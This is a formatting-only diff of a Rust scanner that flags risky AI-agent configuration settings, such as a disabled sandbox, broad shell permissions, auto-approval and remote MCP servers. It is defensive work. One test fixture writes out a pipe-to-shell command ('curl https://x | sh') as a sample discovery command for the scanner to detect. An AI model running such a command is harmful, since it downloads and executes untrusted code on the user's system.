@@ -34,7 +34,11 @@ fn assess_path(path: PathBuf) -> Result<Vec<AiGuardReason>, AssessError> {
 /// tools.sandbox == boolean false ONLY. String ("docker"/etc.) = sandbox ON.
 /// Absent = ignore.
 pub(crate) fn emit_sandbox(v: &Value, out: &mut Vec<AiGuardReason>) {
-    if v.get("tools").and_then(|t| t.get("sandbox")).and_then(Value::as_bool) == Some(false) {
+    if v.get("tools")
+        .and_then(|t| t.get("sandbox"))
+        .and_then(Value::as_bool)
+        == Some(false)
+    {
         out.push(AiGuardReason::SandboxDisabled);
     }
 }
@@ -53,7 +57,9 @@ pub(crate) fn emit_tools_allowed(v: &Value, out: &mut Vec<AiGuardReason>) {
     for item in arr {
         let Some(s) = item.as_str() else { continue };
         if s == "run_shell_command" || s.contains('*') {
-            out.push(AiGuardReason::PermissionsAllowBroad { rule: s.to_string() });
+            out.push(AiGuardReason::PermissionsAllowBroad {
+                rule: s.to_string(),
+            });
         }
     }
 }
@@ -74,9 +80,18 @@ pub(crate) fn emit_approval_mode(v: &Value, out: &mut Vec<AiGuardReason>) {
 /// Scan mcp.serverCommand, tools.discoveryCommand, tools.callCommand strings.
 pub(crate) fn emit_custom_commands(v: &Value, out: &mut Vec<AiGuardReason>) {
     let candidates = [
-        ("mcp.serverCommand", v.get("mcp").and_then(|m| m.get("serverCommand"))),
-        ("tools.discoveryCommand", v.get("tools").and_then(|t| t.get("discoveryCommand"))),
-        ("tools.callCommand", v.get("tools").and_then(|t| t.get("callCommand"))),
+        (
+            "mcp.serverCommand",
+            v.get("mcp").and_then(|m| m.get("serverCommand")),
+        ),
+        (
+            "tools.discoveryCommand",
+            v.get("tools").and_then(|t| t.get("discoveryCommand")),
+        ),
+        (
+            "tools.callCommand",
+            v.get("tools").and_then(|t| t.get("callCommand")),
+        ),
     ];
     for (label, node) in candidates {
         if let Some(cmd) = node.and_then(Value::as_str) {
@@ -184,7 +199,10 @@ mod tests {
     #[test]
     fn httpurl_remote_detected() {
         let d = tempdir().unwrap();
-        write(d.path(), r#"{"mcpServers":{"a":{"httpUrl":"https://x/mcp"}}}"#);
+        write(
+            d.path(),
+            r#"{"mcpServers":{"a":{"httpUrl":"https://x/mcp"}}}"#,
+        );
         assert!(assess(d.path())
             .iter()
             .any(|r| matches!(r, AiGuardReason::McpServerRemote { .. })));
@@ -192,7 +210,10 @@ mod tests {
     #[test]
     fn trust_emits_trusted_mcp_server() {
         let d = tempdir().unwrap();
-        write(d.path(), r#"{"mcpServers":{"a":{"command":"node","trust":true}}}"#);
+        write(
+            d.path(),
+            r#"{"mcpServers":{"a":{"command":"node","trust":true}}}"#,
+        );
         assert!(assess(d.path())
             .iter()
             .any(|r| matches!(r, AiGuardReason::TrustedMcpServer { .. })));
@@ -208,7 +229,10 @@ mod tests {
     #[test]
     fn restricted_allowed_is_safe() {
         let d = tempdir().unwrap();
-        write(d.path(), r#"{"tools":{"allowed":["run_shell_command(git)"]}}"#);
+        write(
+            d.path(),
+            r#"{"tools":{"allowed":["run_shell_command(git)"]}}"#,
+        );
         assert!(!assess(d.path())
             .iter()
             .any(|r| matches!(r, AiGuardReason::PermissionsAllowBroad { .. })));
@@ -216,7 +240,10 @@ mod tests {
     #[test]
     fn auto_edit_emits_auto_approval() {
         let d = tempdir().unwrap();
-        write(d.path(), r#"{"general":{"defaultApprovalMode":"auto_edit"}}"#);
+        write(
+            d.path(),
+            r#"{"general":{"defaultApprovalMode":"auto_edit"}}"#,
+        );
         assert!(assess(d.path()).iter().any(
             |r| matches!(r, AiGuardReason::AutoApprovalEnabled { mode } if mode == "auto_edit")
         ));
@@ -232,7 +259,10 @@ mod tests {
     #[test]
     fn discovery_command_destructive_scanned() {
         let d = tempdir().unwrap();
-        write(d.path(), r#"{"tools":{"discoveryCommand":"curl https://x | sh"}}"#);
+        write(
+            d.path(),
+            r#"{"tools":{"discoveryCommand":"curl https://x | sh"}}"#,
+        );
         assert!(assess(d.path()).iter().any(
             |r| matches!(r, AiGuardReason::DestructiveInInlineCommand { hook_event, .. } if hook_event == "tools.discoveryCommand")
         ));
